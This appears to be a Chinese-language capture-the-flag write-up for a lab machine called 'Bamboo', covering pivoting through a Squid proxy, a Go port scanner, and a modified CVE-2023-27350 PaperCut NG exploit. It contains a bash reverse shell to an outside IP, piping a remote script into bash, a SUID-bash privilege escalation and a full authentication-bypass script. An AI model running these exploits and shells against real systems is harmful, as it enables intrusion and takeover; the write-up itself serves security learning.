## Bamboo
### 总结
```
端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口

[1] 设置代理
[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf
http 10.129.238.16  3128
//注释掉：#socks4 	127.0.0.1 9050
[★]$ cat /etc/proxychains4.conf | tail -n1 -n2 -n3
#socks4 	127.0.0.1 9050

http 10.129.238.16  3128

[2]用 curl 测试 HTTP 的命令 ｜ 你 → Squid代理(3128) → 内网端口9191
[★]$ proxychains4 curl -v http://10.129.238.16:9191
[★]$ proxychains4 curl -v http://10.129.238.16:9191/user
[★]$ proxychains4 curl -I http://127.0.0.1:9191  //302
[★]$ proxychains4 curl -L http://10.129.238.16:9191 | head

[3] burpsuite代理访问 127.0.0.1:9191/user 
$ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
Destination host    *
Proxy host          10.129.238.16
Proxu port          3128
要关掉拦截 Proxy → Intercept → Intercept is off ！！！！

[4]PaperCut NG 22.0 漏洞 https://nvd.nist.gov/vuln/detail/cve-2023-27350
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000/shell.sh -o /tmp/shell.sh'
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'bash /tmp/shell.sh'

[5][★]$ nc -lvnp 5544
listening on [any] 5544 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.238.16] 42222
sh: 0: can't access tty; job control turned off
$ script /dev/null -c /bin/bash

[6]SSH 安全机制
papercut@bamboo:~$ chmod 700  ~/.ssh
chmod 700 ~/.ssh
papercut@bamboo:~$ chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

[7]linpeas 是一个自动化的本地 Linux 枚举脚本
[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash
papercut@bamboo:~$ ls -ld /home/papercut/server/bin/linux-x64
ls -ld /home/papercut/server/bin/linux-x64
drwxr-xr-x 3 papercut papercut 4096 May 26  2023 /home/papercut/server/bin/linux-x64

[8]影响 PaperCut 22 版本的 CVE-2023-27350 认证绕过漏洞
https://www.exploit-db.com/exploits/51391
[★]$ chmod 600 id_rsa
[★]$ ssh -i id_rsa papercut@10.129.2.255 -L 9191:127.0.0.1:9191 -N
[★]$ python3 auth_bypass.py
Enter the ip address: 127.0.0.1
Version: 22.0.6
Vulnerable version
Step 1 visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
Step 2 visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
在burpsuite代理登录 http://127.0.0.1:9191/app?service=page/SetupCompleted 即可绕过登录

[9]pspy :无 root 权限也能监控系统进程的工具
[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
papercut@bamboo:~$ cd /tmp
papercut@bamboo:/tmp$ wget http://10.10.14.27:9000/pspy64
papercut@bamboo:/tmp$ ./pspy64
在burpsuite点击“Refresh servers”按钮后，我们发现执行的确实是相同的脚本
点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers

以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers -> Refresh servers

[10][★]$ nc -lvnp 5544
$ script /dev/null -c /bin/bash

bash-5.1$ cd tmp
bash-5.1$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
bash-5.1$ /bin/bash -p
bash-5.1# id
uid=1001(papercut) gid=1001(papercut) euid=0(root) groups=1001(papercut)
```
```
[★]$ nmap -sC -sV 10.129.238.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 23:54 CST
Nmap scan report for 10.129.238.16
Host is up (0.0090s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### 既然 3128 端口已开放，该端口通常用于代理服务器，尤其是 Squid 代理，那么配置错误的实例就可以用于转向内部服务。我们可以按照 HackTricks 上的指南来枚举通过 Squid 代理可访问的服务。还有一个工具我们可以使用。首先，我们下载 squidscan 仓库文件，包括 go.mod 和 squidscan.go。然后，我们编辑 squidscan.go，将 proxyURL 设置为代理服务器的 IP 和端口。
#### [1]端口工具 
https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
#### Squid是一款缓存转发型 HTTP Web 代理。它用途广泛，包括通过缓存重复请求来加速 Web 服务器，为共享网络资源的群体缓存 Web、DNS 和其他计算机网络查询，以及通过过滤流量来增强安全性。虽然 Squid 主要用于 HTTP 和 FTP，但也对其他一些协议（例如 Internet Gopher、SSL、TLS 和 HTTPS）提供有限的支持。与 Privoxy 不同，Squid 本身不支持 SOCKS 协议，但可以通过与 Privoxy 配合使用来提供 SOCKS 支持。
#### [2]Squidscan
https://gist.github.com/xct/597d48456214b15108b2817660fdee00
```
[★]$ cat go.mod
module squidscan

go 1.16

require github.com/cheggaaa/pb/v3 v3.1.2
```
```
[★]$ cat squidscan.go
package main

import (
	"fmt"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"
	"strings"
	"io/ioutil"
	"github.com/cheggaaa/pb/v3"
)

var (
		proxyURL = "http://10.129.238.16:3128" // adjust proxy ip & port 
	numWorkers = 100  // adjust workers
	numPorts = 65535 // adjust ports
)

func main() {
	proxyURL, err := url.Parse(proxyURL)
	if err != nil {
		fmt.Printf("Failed to parse proxy URL: %v\n", err)
		return
	}
	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
		}).DialContext,
	}
	client := &http.Client{Transport: transport}
	openPorts := make([]int, 0)

	bar := pb.StartNew(numPorts)
	sem := make(chan struct{}, numWorkers)
	var wg sync.WaitGroup
	for port := 1; port <= numPorts; port++ {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			sem <- struct{}{} 
			defer func() {
				<-sem 
				bar.Increment()
			}()

			address := fmt.Sprintf("127.0.0.1:%d", p)
			r, err := client.Get(fmt.Sprintf("http://%s", address))
			if err != nil {
				return
			}
			data, _ := ioutil.ReadAll(r.Body)
			dataStr := string(data)
			if strings.Contains(dataStr,"The requested URL could not be retrieved"){
				return;
			} 
			defer r.Body.Close()
			openPorts = append(openPorts, p)
			fmt.Printf("Port %d found!\n", p)

		}(port)
	}
	wg.Wait()
	bar.Finish()

	fmt.Println("Open ports:")
	for _, port := range openPorts {
		fmt.Println(port)
	}
}
```
#### 然后我们运行 go.mod tidy 来安装依赖项并构建二进制文件。好玩 
```
[★]$ go mod tidy
go: downloading github.com/cheggaaa/pb/v3 v3.1.2
go: downloading github.com/VividCortex/ewma v1.2.0
go: downloading github.com/fatih/color v1.14.1
go: downloading github.com/mattn/go-colorable v0.1.13
go: downloading github.com/mattn/go-isatty v0.0.17
go: downloading github.com/mattn/go-runewidth v0.0.12
go: downloading golang.org/x/sys v0.5.0
go: downloading github.com/rivo/uniseg v0.2.0
[★]$ go build
[★]$ ls
cacert.der  Downloads  go.sum   Pictures   squidscan.go
Desktop     go         Music    Public     Templates
Documents   go.mod     my_data  squidscan  Videos
```
#### 从输出结果中我们可以看到，squidscan 可执行文件已生成，现在我们可以执行它来启动扫描。
```
[★]$ ./squidscan
Port 22 found!
8927 / 65535 [------>_______________________________________] 13.62% 3173 p/sPort 9173 found!
Port 9174 found!
10368 / 65535 [------->_____________________________________] 15.82% 3173 p/sPort 9192 found!
Port 9195 found!
20291 / 65535 [------------->_______________________________] 30.96% 1494 p/sPort 9191 found!
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s
65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s65534 / 65535 [---------------------------------------------->] 100.00% 0 p/s^C

//得到
Port 22 found!
Port 9173 found!
Port 9174 found!
Port 9192 found!
Port 9195 found!
Port 9191 found! //常见于 qBittorrent Web UI
```
#### 我们找到一些开放端口，然后按照“黑客技巧”博客中的说明编辑我们的代理链文件，接着便开始对这些端口进行枚举。
#### 查看 代理配置文件 的最后一行
```
[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf
http 10.129.238.16  3128
[★]$ cat /etc/proxychains4.conf | tail -n1
http 10.129.238.16  3128

//注释掉：#socks4 	127.0.0.1 9050
[★]$ sudo vi /etc/proxychains4.conf
[★]$ cat /etc/proxychains4.conf | tail -n1 -n2 -n3
#socks4 	127.0.0.1 9050

http 10.129.238.16  3128
```
#### 用 curl 测试 HTTP
```
[★]$ proxychains4 curl -v http://10.129.238.16:9191
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
*   Trying 10.129.238.16:9191...
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
* Connected to 10.129.238.16 (10.129.238.16) port 9191 (#0)
> GET / HTTP/1.1
> Host: 10.129.238.16:9191
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Sat, 07 Mar 2026 06:41:13 GMT
< Location: http://10.129.238.16:9191/user
< Content-Length: 0
< 
* Connection #0 to host 10.129.238.16 left intact
```
#### 你通过 ProxyChains 使用 Squid 成功访问了目标端口；
#### 你 → Squid代理(3128) → 内网端口9191
#### 从该请求中，我们得知网址为 http://10.129.234.79:9191/user 
#### 服务器返回了 HTTP/1.1 302“已找到”状态，并带有“Location: http://10.129.234.79:9191/user”这一头部信息，该信息指示客户端重定向至该网址
#### 现在，如果我们对 /user 端点运行 curl 命令，就会发现标题确实是“PaperCut”
```
[★]$ proxychains4 curl -v http://10.129.238.16:9191/user
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
*   Trying 10.129.238.16:9191...
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
* Connected to 10.129.238.16 (10.129.238.16) port 9191 (#0)
> GET /user HTTP/1.1
> Host: 10.129.238.16:9191
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 07 Mar 2026 06:45:02 GMT
< X-Frame-Options: SAMEORIGIN
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1
< Set-Cookie: JSESSIONID=node0lu1bwtq9ia9sywnx5q3efnx31.node0; Path=/; HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Cache-Control: no-cache
< Cache-Control: no-store
< Pragma: no-cache
< Content-Type: text/html;charset=utf-8
< Vary: Accept-Encoding, User-Agent
< Transfer-Encoding: chunked
< 
<!DOCTYPE HTML>
<!-- Application: app-server -->
<!-- Page: Home -->
<!-- Generated: Sat Mar 07 06:45:02 UTC 2026 -->
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<title>PaperCut Login for Trial License</title>
<link rel="shortcut icon" href="/images/icons3/favicon.ico" type="image/vnd.microsoft.icon"/>
</SNIP>
```
#### 我们正在使用 PaperCut NG 在 9191 端口运行程序。然后我们可以配置 Burp Suite 来使用这个代理。地址。
#### 首先，我们启动 Burp Suite，然后选择“代理设置” -> “网络” -> “连接” -> “上游代理服务器”，接着在相应字段中输入代理服务器的主机名和端口号。
#### $ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
```
Destination host    *
Proxy host          10.129.238.16
Proxu port          3128
```
#### 要关掉拦截 Proxy → Intercept → Intercept is off ！！！！
#### 在我们的 Burp 浏览器中访问 127.0.0.1:9191/user 页面（同时配置了代理），我们看到了 PaperCut NG 22.0 的登录页面，这是一个打印管理应用程序。
![图片](images/2026030701.png)
### Foothold
```
[★]$ proxychains4 curl -I http://127.0.0.1:9191
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  127.0.0.1:9191  ...  OK
HTTP/1.1 302 Found
Date: Sat, 07 Mar 2026 07:31:07 GMT
Location: http://127.0.0.1:9191/user
Content-Length: 0

[★]$ proxychains4 curl -L http://10.129.238.16:9191 | head
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[proxychains] Strict chain  ...  10.129.238.16:3128  ...  10.129.238.16:9191  ...  OK
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
<!DOCTYPE HTML>
<!-- Application: app-server -->
<!-- Page: Home -->
<!-- Generated: Sat Mar 07 07:32:05 UTC 2026 -->
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<title>PaperCut Login for Trial License</title>
<link rel="shortcut icon" href="/images/icons3/favicon.ico" type="image/vnd.microsoft.icon"/>
<meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
100 12392    0 12392    0     0  96593      0 --:--:-- --:--:-- --:--:-- 96593
curl: (23) Failed writing body
```
#### 对 PaperCut NG 22 所存在的漏洞进行快速的谷歌搜索，结果显示存在 CVE-2023-27350 这个漏洞，还有这个 POC 脚本。我们通过在本地启动一个 Python 服务器来处理来自目标设备的 GET 请求来进行测试。
#### 描述 
https://nvd.nist.gov/vuln/detail/cve-2023-27350
#### 此漏洞允许远程攻击者绕过受影响的 PaperCut NG 22.0.5（版本 63914）安装的身份验证。利用此漏洞无需身份验证。具体缺陷存在于 SetupCompleted 类中。该问题源于访问控制不当。攻击者可以利用此漏洞绕过身份验证，并在 SYSTEM 上下文中执行任意代码。漏洞编号为 ZDI-CAN-18987。
https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py
```
[★]$ wget https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py
```
#### 修改CVE-2023-27350.py  postback = "java.lang.Runtime.getRuntime().exec('{command}');"
```
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('cmd.exe /C \"for /F \"usebackq delims=\" %A in (`whoami`) do curl http://10.0.40.83:8081/%A\"');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)


//改为
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('{command}');" //修改1
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)

```
#### 开启侦听
```
[★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```
#### payload命令
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl  http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
```
#### 再修改CVE-2023.27350.py
```
[★]$ cat CVE-2023-27350.py
#!/usr/bin/python3
import argparse
import requests


def get_session_id(base_url):
    s = requests.Session()
    s.proxies = {
            "http": "http://10.129.238.16:3128", //修改2
            "https": "http://10.129.238.16:3128"
            }
    r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
    
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
```
#### 还差一点点
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[-] Might not have a printer configured. Exploit manually by adding one.
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 在burpsuite里面还无法登录，所在的页面是http://127.0.0.1:9191/app
#### 要继续修改CVE-2023-27350.py,把GET改为POST，GET是读取，不会触发操作
```
// 需要改2个GET为post
def execute(base_url, session, command):
    print('[*] Prepparing to execute...')
    postback = "java.lang.Runtime.getRuntime().exec('{command}');"
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False) //修改3

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False) ////修改3
```
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 回顾我们的 HTTP 服务器，我们看到了 GET 请求，这证明该脚本是有效的。
```
[★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
```
#### 写反弹
```
[★]$ vi shell.sh
[★]$ cat shell.sh
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.27/5544 0>&1
```
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000/shell.sh -o /tmp/shell.sh'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
```
 [★]$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.129.238.16 - - [07/Mar/2026 02:30:34] "GET / HTTP/1.1" 200 -
10.129.238.16 - - [07/Mar/2026 02:59:49] code 404, message File not found
10.129.238.16 - - [07/Mar/2026 03:00:02] "GET /shell.sh HTTP/1.1" 200 -
```
#### 运行反弹
```
[★]$ nc -lvnp 5544
listening on [any] 5544 ...
```
```
[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'bash /tmp/shell.sh'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```
#### 看着我们的听众，我们接收到来自 PaperCut 主机的连接。然后我们使用脚本，该脚本创建了一个伪终端，并使用参数 -c /bin/bash 和 /dev/null 来启动一个新的交互式 bash 命令行，并丢弃输出日志，从而为我们提供一个更稳定的命令行环境。
#### $ script /dev/null -c /bin/bash
```
[★]$ nc -lvnp 5544
listening on [any] 5544 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.238.16] 42222
sh: 0: can't access tty; job control turned off
$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
papercut@bamboo:~/server$ id
id
uid=1001(papercut) gid=1001(papercut) groups=1001(papercut)
papercut@bamboo:~/server$
papercut@bamboo:~$ cat /home/papercut/user.txt
```
### Privilege Escalation
```
papercut@bamboo:~$ mkdir .ssh
mkdir .ssh
papercut@bamboo:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/papercut/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/papercut/.ssh/id_rsa
Your public key has been saved in /home/papercut/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:JAMXPIdEcJvOKiZ14QexhEI7G35GXM/cKt/lp4D2LCE papercut@bamboo
The key's randomart image is:
+---[RSA 3072]----+
|.. .=**o         |
|. +..*Boo        |
| = o+ =*..       |
|. =. = +.        |
| o.oo.+.S  .     |
| .o. Eo.o o      |
|. o . .+.o . .   |
| o .  ..o . o    |
|        .o .     |
+----[SHA256]-----+
papercut@bamboo:~$ cd .ssh
cd .ssh
papercut@bamboo:~/.ssh$ ls -la
ls -la
total 16
drwxr-xr-x 2 papercut papercut 4096 Mar  7 09:11 .
drwxr-xr-x 9 papercut papercut 4096 Mar  7 09:10 ..
-rw------- 1 papercut papercut 2602 Mar  7 09:11 id_rsa
-rw-r--r-- 1 papercut papercut  569 Mar  7 09:11 id_rsa.pub
papercut@bamboo:~/.ssh$
papercut@bamboo:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwXqQTrYKCBgYz4pXU0LvcmMnmciAZZmsw/6NEhSHfMjV97VwGl4u4WjIopvLxn9ptFeyQ1qDxcm82LR1wgA8OU3uCP9sI12mLJeha9pYYtK4cbhv02sqJxyktG+fWpTn3iRRnR7AvFabodqUmRaicJFf4dAPERV44MhdavB8fEuscnCCcPXjTZndGwoVbDjBmOta0dxLoGehcwBJRoCjrvqW1uiXU0HeV36Fv9MNBM9IAS8wNbEOKDSz5iPboub+gfqGeA5YINaCGcKo7dsIuDHh8yTMACuHlOi0s+MZ+HLxlNev3nxm7uugohNRqyQFkGx2ca2Nf8clxjIGX2tJxXZJVbbbY6S+P3rLskg6QiF1qYNtNBCEjb/jnlb6Oxsut71jzp3MwDC3oMehHXdEjnNGki9eA4Lun+o5aCBioJ7SEnPm1p1MeyXf/BNPKa4W5xBjOZzpsN/SHdresaokoyyc8zynrjMoBs+FzPxI/ZLxCGahfJtJQ99pbHpKYIEM= papercut@bamboo
papercut@bamboo:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwXqQTrYKCBgYz4pXU0LvcmMnmciAZZmsw/6NEhSHfMjV97VwGl4u4WjIopvLxn9ptFeyQ1qDxcm82LR1wgA8OU3uCP9sI12mLJeha9pYYtK4cbhv02sqJxyktG+fWpTn3iRRnR7AvFabodqUmRaicJFf4dAPERV44MhdavB8fEuscnCCcPXjTZndGwoVbDjBmOta0dxLoGehcwBJRoCjrvqW1uiXU0HeV36Fv9MNBM9IAS8wNbEOKDSz5iPboub+gfqGeA5YINaCGcKo7dsIuDHh8yTMACuHlOi0s+MZ+HLxlNev3nxm7uugohNRqyQFkGx2ca2Nf8clxjIGX2tJxXZJVbbbY6S+P3rLskg6QiF1qYNtNBCEjb/jnlb6Oxsut71jzp3MwDC3oMehHXdEjnNGki9eA4Lun+o5aCBioJ7SEnPm1p1MeyXf/BNPKa4W5xBjOZzpsN/SHdresaokoyyc8zynrjMoBs+FzPxI/ZLxCGahfJtJQ99pbHpKYIEM= papercut@bamboo" > authorized_keys
<JtJQ99pbHpKYIEM= papercut@bamboo" > authorized_keys

//检验
papercut@bamboo:~/.ssh$ cd ..
cd ..
papercut@bamboo:~$ ls -la ~/.ssh
ls -la ~/.ssh
total 20
drwxr-xr-x 2 papercut papercut 4096 Mar  8 08:57 . //751
drwxr-xr-x 9 papercut papercut 4096 Mar  8 08:55 ..
-rw-r--r-- 1 papercut papercut  569 Mar  8 08:57 authorized_keys //644
-rw------- 1 papercut papercut 2602 Mar  8 08:56 id_rsa
-rw-r--r-- 1 papercut papercut  569 Mar  8 08:56 id_rsa.pub

//SSH 安全机制
papercut@bamboo:~$ chmod 700  ~/.ssh
chmod 700 ~/.ssh
papercut@bamboo:~$ chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
papercut@bamboo:~$ ls -la ~/.ssh
ls -la ~/.ssh
total 20
drwx------ 2 papercut papercut 4096 Mar  8 08:57 .
drwxr-xr-x 9 papercut papercut 4096 Mar  8 08:55 ..
-rw------- 1 papercut papercut  569 Mar  8 08:57 authorized_keys
-rw------- 1 papercut papercut 2602 Mar  8 08:56 id_rsa
-rw-r--r-- 1 papercut papercut  569 Mar  8 08:56 id_rsa.pub
```
#### 现在，我们将使用 linpeas 来对系统进行枚举。linpeas 是一个自动化的本地 Linux 枚举脚本，用于查找常见的权限提升途径。
```
[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
#### 从输出结果中我们可以看到，linpeas在路径中找到了 /home/papercut/server/bin/linux-x64 。如果一个具有特权权限的进程使用了该路径，并且该目录可被非特权用户写入，那么我们就可以在其中放置一个脚本或二进制文件，当该进程调用一个常见的命令时，该文件可能会被执行，从而可能导致权限提升后的 shell 环境。因此，我们接着检查了该文件夹的权限。
```
papercut@bamboo:~/.ssh$ cd ..
cd ..
papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash
<SNIP>
╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

╔══════════╣ Environment
╚ Any private information inside environment variables?
SHELL=/bin/bash
WRAPPER_PATH_SEPARATOR=:
WRAPPER_BITS=32
PWD=/home/papercut
LOGNAME=papercut
HOME=/home/papercut
LANG=C.UTF-8
LESSCLOSE=/bin/lesspipe %s %s
LESSOPEN=| /bin/lesspipe %s
USER=papercut
SHLVL=2
WRAPPER_FILE_SEPARATOR=/
WRAPPER_ARCH=x86
WRAPPER_OS=windows
OLDPWD=/home/papercut/.ssh
_=/bin/env
</SNIP>
```
#### 查找
```
papercut@bamboo:~$ ls /home/papercut/server/bin/
ls /home/papercut/server/bin/
linux-x64
papercut@bamboo:~$ ls -ld /home/papercut/server/bin/linux-x64
ls -ld /home/papercut/server/bin/linux-x64
drwxr-xr-x 3 papercut papercut 4096 May 26  2023 /home/papercut/server/bin/linux-x64
```
#### 这表明该目录归用户 papercut 所有。因此，papercut 用户可以在 /home/papercut/server/bin/linux-x64 中创建或修改文件，此目录包含 PaperCut NG 的可执行文件和脚本。
#### 从我们之前的列举中，我们还发现了影响 PaperCut 22 版本的 CVE-2023-27350 认证绕过漏洞。我们找到了一个允许认证绕过的脚本，可以利用它访问应用程序，并查看是否存在任何在触发时会使用我们之前识别的目录中的文件的功能。我们首先设置 SSH 端口转发。
https://www.exploit-db.com/exploits/51391
https://nvd.nist.gov/vuln/detail/cve-2023-27350 //上面的
#### 两者的区别：Exploit-DB → 利用漏洞的脚本；；；；NVD → 官方漏洞说明
```
[★]$ vi auth_bypass.py
[★]$ cat auth_bypass.py
# Exploit Title: PaperCut NG/MG 22.0.4 - Authentication Bypass
# Date: 21 April 2023
# Exploit Author: MaanVader
# Vendor Homepage: https://www.papercut.com/
# Version: 8.0 or later
# Tested on: 22.0.4
# CVE: CVE-2023-27350

import requests
from bs4 import BeautifulSoup
import re

def vuln_version():
    ip = input("Enter the ip address: ")
    url = "http://"+ip+":9191"+"/app?service=page/SetupCompleted"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    text_div = soup.find('div', class_='text')
    product_span = text_div.find('span', class_='product')

    # Search for the first span element containing a version number
    version_span = None
    for span in text_div.find_all('span'):
        version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
        if version_match:
            version_span = span
            break

    if version_span is None:
        print('Not Vulnerable')
    else:
        version_str = version_span.text.strip()
        print('Version:', version_str)
        print("Vulnerable version")
        print(f"Step 1 visit this url first in your browser: {url}")
        print(f"Step 2 visit this url in your browser to bypass the login page : http://{ip}:9191/app?service=page/Dashboard")


if __name__ =="__main__":
